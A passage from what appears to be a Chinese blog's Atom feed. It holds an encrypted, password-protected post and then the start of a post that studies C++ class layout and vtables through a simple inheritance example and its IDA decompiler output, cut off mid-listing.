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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  